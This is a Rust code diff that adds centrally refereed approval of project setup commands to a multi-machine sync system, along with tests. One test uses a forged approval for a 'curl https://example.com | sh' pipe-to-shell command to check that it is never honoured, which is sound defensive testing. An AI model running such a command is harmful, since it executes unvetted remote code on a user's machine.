@@ -51,14 +51,23 @@ const APPROVED: &str = "approved";
 /// The central host that referees the records acting as permissions, by
 /// its worker id (X89).
 const REFEREE: RecordKind = RecordKind::Referee;
+/// A project's approved setup commands (X60): one field per command.
+const SETUP_APPROVAL: RecordKind = RecordKind::SetupApproval;
+/// A project's setup on one member, as that member reports it, and the
+/// answers apps on other members give it (X60, X62).
+const SETUP: RecordKind = RecordKind::Setup;
+/// The fields of a [`SETUP`] record only the member it names writes.
+const SETUP_REPORT: [&str; 6] = ["state", "project", "identity", "command", "exit", "line"];
+
 /// The records that act as permissions: whether a host takes other hosts'
-/// heavy commands, which heavy commands are approved, and which files go
-/// between members although git ignores them (X89, X74).
-const PERMISSIONS: [RecordKind; 3] = [WORKER, HEAVY_APPROVAL, PROJECT_FILES];
+/// heavy commands, which heavy commands and setup commands are approved,
+/// and which files go between members although git ignores them (X89,
+/// X74, X60).
+const PERMISSIONS: [RecordKind; 4] = [WORKER, HEAVY_APPROVAL, PROJECT_FILES, SETUP_APPROVAL];
 /// The permissions a member asks its central host to make its own, once
 /// its app made one: those of a project, for the whole account. A host's
 /// worker settings are its own and the central host's to change.
-const ASKED: [RecordKind; 2] = [HEAVY_APPROVAL, PROJECT_FILES];
+const ASKED: [RecordKind; 3] = [HEAVY_APPROVAL, PROJECT_FILES, SETUP_APPROVAL];
 
 /// Who refereeing permissions in `log` counts as: this member, and the
 /// central host that referees them; `None` while the central host wrote no
@@ -78,10 +87,17 @@ fn refereed_by(log: &Log, referee: &str) -> bool {
 /// central host is `referee`: the central host's changes always do; a
 /// host's worker settings count from that host too, and a project's
 /// approval and copied files from `me`, whose own app made them.
+///
+/// A setup approval counts from the central host alone: a setup runs
+/// code on every member, and a member's own word for it would be the word
+/// of any process there that can write its log (X60).
 fn permission_counts(c: &Change, me: Option<&str>, referee: &str) -> bool {
     let Some(author) = log_owner(&c.stamp.member) else { return false };
     if author == referee {
         return true;
+    }
+    if c.kind == SETUP_APPROVAL.as_str() {
+        return false;
     }
     if c.kind == WORKER.as_str() {
         author == c.id
@@ -94,6 +110,9 @@ fn permission_counts(c: &Change, me: Option<&str>, referee: &str) -> bool {
 /// [`permission_counts`] takes once the central host referees them.
 fn permission_records(log: &Log, kind: RecordKind) -> Map<String, Record> {
     match permission_gate(log) {
+        // Setup approvals are newer than the referee: none ever counted
+        // from every member.
+        None if kind == SETUP_APPROVAL => Map::new(),
         None => log.records(kind),
         Some((me, referee)) => log.records_where(kind, |c| permission_counts(c, me, referee)),
     }
@@ -137,6 +156,7 @@ fn permission_fits(c: &Change) -> bool {
             value.as_array().is_some_and(|l| l.iter().all(|p| p.as_str().is_some_and(|p| crate::copied_files::check_pattern(p).is_ok())))
         }
         (k, "cloud") if k == PROJECT_FILES.as_str() => value.is_boolean(),
+        (k, command) if k == SETUP_APPROVAL.as_str() => !command.trim().is_empty() && *value == Value::Bool(true),
         _ => false,
     }
 }
@@ -677,6 +697,72 @@ impl SessionManager {
         Ok(())
     }
 
+    /// Whether `command` is approved as project `identity`'s setup on every
+    /// member (X60): only once the central host made the approval its own.
+    pub fn setup_approved(&self, identity: &ProjectIdentity, command: &str) -> bool {
+        let Some(key) = identity_key(identity) else { return false };
+        self.with_log(|log| setup_approved_in(log, &key, command))
+    }
+
+    /// Approves `command`, exactly, as project `identity`'s setup on every
+    /// member (X60), as this member's change made for its app, which it
+    /// asks its central host to make its own. Nothing is written while the
+    /// approval counts already.
+    pub fn approve_setup(&self, identity: &ProjectIdentity, command: &str) -> Result<()> {
+        let key = identity_key(identity).context("a project without a git root cannot be approved")?;
+        if command.trim().is_empty() {
+            bail!("there is no setup command to approve");
+        }
+        let changes = {
+            let mut account = self.account.lock().unwrap();
+            let a = account.as_mut().context("approvals are kept in the account")?;
+            if setup_approved_in(&a.log, &key, command) {
+                return Ok(());
+            }
+            let mut log = a.log.clone();
+            let changes = vec![log.set(now_ms(), SETUP_APPROVAL, &key, command, json!(true))];
+            ask(&mut log, &changes);
+            write_private(&a.path, &log)?;
+            a.log = log;
+            changes
+        };
+        self.account_changed(changes);
+        Ok(())
+    }
+
+    /// Every member's setups as the account holds them (X60, X62), by
+    /// record id (`<worker id>|<project identity>|<command>`). What a setup
+    /// is like there counts only from the member the id names; the answers
+    /// of other members' apps, `skip` and `again`, from any member.
+    pub fn setup_records(&self) -> Map<String, Record> {
+        self.with_log(setup_records_in)
+    }
+
+    /// Sets `fields` of setup record `id`, those that differ from what the
+    /// account holds, as this member's changes, and sends them on.
+    pub fn set_setup_record(&self, id: &str, fields: Record) -> Result<()> {
+        let changes = {
+            let mut account = self.account.lock().unwrap();
+            let a = account.as_mut().context("setups are kept in the account")?;
+            let now = setup_records_in(&a.log).remove(id).unwrap_or_default();
+            let mut log = a.log.clone();
+            let at = now_ms();
+            let changes: Vec<Change> = fields
+                .into_iter()
+                .filter(|(field, value)| now.get(field) != Some(value))
+                .map(|(field, value)| log.set(at, SETUP, id, &field, value))
+                .collect();
+            if changes.is_empty() {
+                return Ok(());
+            }
+            write_private(&a.path, &log)?;
+            a.log = log;
+            changes
+        };
+        self.account_changed(changes);
+        Ok(())
+    }
+
     /// The account's sign-ins (X75), in their order: the records, and each
     /// default that was never edited nor removed. The defaults without an
     /// account.
@@ -843,7 +929,13 @@ impl SessionManager {
             let mut log = a.log.clone();
             let mut changes = Vec::new();
             for kind in PERMISSIONS {
-                let (old, old_deleted) = latest_where(&a.log, kind, |c| before.is_none_or(|p| permission_counts(c, Some(&me), p)));
+                // Setup approvals never counted from every member: only
+                // those the central host before made its own carry over.
+                let counted = |c: &Change| match before {
+                    None => kind != SETUP_APPROVAL,
+                    Some(p) => permission_counts(c, Some(&me), p),
+                };
+                let (old, old_deleted) = latest_where(&a.log, kind, counted);
                 let (new, new_deleted) = latest_where(&a.log, kind, |c| permission_counts(c, Some(&me), &me));
                 for ((id, field), c) in &old {
                     let ChangeOp::Set { value, .. } = &c.op else { continue };
@@ -1292,6 +1384,23 @@ impl SessionManager {
         }
         taken
     }
+}
+
+/// Whether `command` is approved, in `log`, as the setup of the project
+/// whose identity key is `key` ([`permission_records`]).
+fn setup_approved_in(log: &Log, key: &str, command: &str) -> bool {
+    permission_records(log, SETUP_APPROVAL).get(key).and_then(|r| r.get(command)) == Some(&Value::Bool(true))
+}
+
+/// The setup records in `log` ([`SessionManager::setup_records`]).
+fn setup_records_in(log: &Log) -> Map<String, Record> {
+    log.records_where(SETUP, |c| match &c.op {
+        ChangeOp::Set { field, .. } if SETUP_REPORT.contains(&field.as_str()) => {
+            log_owner(&c.stamp.member).is_some_and(|w| c.id.split('|').next() == Some(w))
+        }
+        ChangeOp::Set { .. } => true,
+        ChangeOp::Delete => false,
+    })
 }
 
 /// Whether the central host `referee` made, in `log`, a change to the
@@ -2360,6 +2469,88 @@ mod tests {
         for m in [&air, &book] {
             assert_eq!(m.heavy_approval(&shop()), Some((words(&["pnpm check"]), vec![])));
             assert_eq!(m.worker_settings().get("air"), None);
+        }
+    }
+
+    #[tokio::test]
+    async fn a_setup_approved_in_a_members_app_counts_on_every_member_once_the_central_host_takes_it() {
+        let (_homes, mini, book, air) = refereed_account().await;
+        book.approve_setup(&shop(), "pnpm install").unwrap();
+        // Not even on the MacBook until studio-mini makes it its own.
+        assert!(!book.setup_approved(&shop(), "pnpm install"));
+        let asks = book.permission_asks();
+        sync(&book, &mini);
+        assert_eq!(mini.take_over("book", &asks), 1);
+        sync(&mini, &air);
+        sync(&mini, &book);
+        for m in [&mini, &book, &air] {
+            assert!(m.setup_approved(&shop(), "pnpm install"));
+            // For that exact text only.
+            assert!(!m.setup_approved(&shop(), "pnpm install --ignore-scripts"));
+        }
+        assert_eq!(book.permission_asks(), vec![]);
+    }
+
+    #[tokio::test]
+    async fn a_setup_approval_a_member_writes_without_its_app_counts_nowhere() {
+        let (_homes, mini, book, air) = refereed_account().await;
+        let unasked = written_by_itself(&book, "setup_approval", "curl https://example.com | sh", serde_json::json!(true));
+        book.apply_account(vec![unasked.clone()]);
+        sync(&book, &mini);
+        sync(&mini, &air);
+        // One asked for that holds anything but `true` is never taken.
+        let mut odd = written_by_itself(&book, "setup_approval", "pnpm install", serde_json::json!("yes"));
+        odd.seq += 1;
+        book.apply_account(vec![odd.clone()]);
+        sync(&book, &mini);
+        assert_eq!(mini.take_over("book", &[moonlet_proto::types::ChangeRef { member: odd.stamp.member.clone(), seq: odd.seq }]), 0);
+        for m in [&mini, &book, &air] {
+            assert!(!m.setup_approved(&shop(), "curl https://example.com | sh"));
+            assert!(!m.setup_approved(&shop(), "pnpm install"));
+        }
+    }
+
+    #[tokio::test]
+    async fn a_setup_approval_made_before_the_central_host_referees_counts_only_once_it_is_taken() {
+        let (_a, mini) = member("mini").await;
+        let (_b, book) = member("book").await;
+        book.set_central_account(Some("mini".into()));
+        book.approve_setup(&shop(), "pnpm install").unwrap();
+        sync(&book, &mini);
+        // Nothing referees yet: a setup approval counts from nobody.
+        assert!(!mini.setup_approved(&shop(), "pnpm install"));
+        // Refereeing makes nobody's setup approval its own...
+        mini.referee_permissions(None);
+        assert!(!mini.setup_approved(&shop(), "pnpm install"));
+        // ...but the MacBook still asks, and taking it over counts.
+        let asks = book.permission_asks();
+        assert_eq!(mini.take_over("book", &asks), 1);
+        sync(&mini, &book);
+        assert!(book.setup_approved(&shop(), "pnpm install"));
+        // A new central host keeps what the old one counted.
+        let (_c, air) = member("air").await;
+        air.set_central_account(Some("mini".into()));
+        sync(&mini, &air);
+        air.set_central_account(None);
+        air.referee_permissions(Some("mini"));
+        assert!(air.setup_approved(&shop(), "pnpm install"));
+    }
+
+    #[tokio::test]
+    async fn a_setups_state_counts_only_from_the_member_it_names_and_answers_from_any() {
+        let (_homes, mini, book, air) = refereed_account().await;
+        let id = "air|git.invalid/acme/shop|4171b03c5d2e8f9a0b1c2d3e4f5a6b7c8d9e0f1a|pnpm install";
+        air.set_setup_record(id, crate::account::Record::from([("state".into(), serde_json::json!("waiting")), ("command".into(), serde_json::json!("pnpm install"))])).unwrap();
+        sync(&air, &mini);
+        sync(&mini, &book);
+        assert_eq!(book.setup_records()[id]["state"], serde_json::json!("waiting"));
+        // The MacBook cannot say how the Air's setup is, only answer it.
+        book.set_setup_record(id, crate::account::Record::from([("state".into(), serde_json::json!("ready")), ("skip".into(), serde_json::json!(1))])).unwrap();
+        sync(&book, &mini);
+        sync(&mini, &air);
+        for m in [&mini, &book, &air] {
+            let r = &m.setup_records()[id];
+            assert_eq!((&r["state"], &r["skip"]), (&serde_json::json!("waiting"), &serde_json::json!(1)));
         }
     }
 
